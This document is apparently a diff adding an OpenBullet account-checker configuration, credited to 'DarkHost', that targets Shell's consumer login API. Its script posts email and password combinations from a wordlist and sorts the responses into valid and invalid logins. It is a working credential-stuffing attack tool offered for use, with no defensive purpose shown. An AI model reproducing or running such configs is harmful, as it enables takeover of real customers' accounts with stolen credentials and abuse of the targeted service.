@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Shell.com",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-19T00:23:33.3283214+01:00",
+  "AdditionalInfo": "",
+  "Author": "DarkHost",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://id.consumer.shell.com/api/v2/account/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"udid\":\"no-udid-provided\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic 0175bfbc3f6913152144d65a84a47449958556a47bb853c1e8db4a8a8c094a3d" 
+  HEADER "X-SSO-Market: en-GB" 
+  HEADER "Channel: Web" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "incorrect_username_or_password_please_try_again\" 
+  KEYCHAIN Success OR 
+    KEY "uuid" 
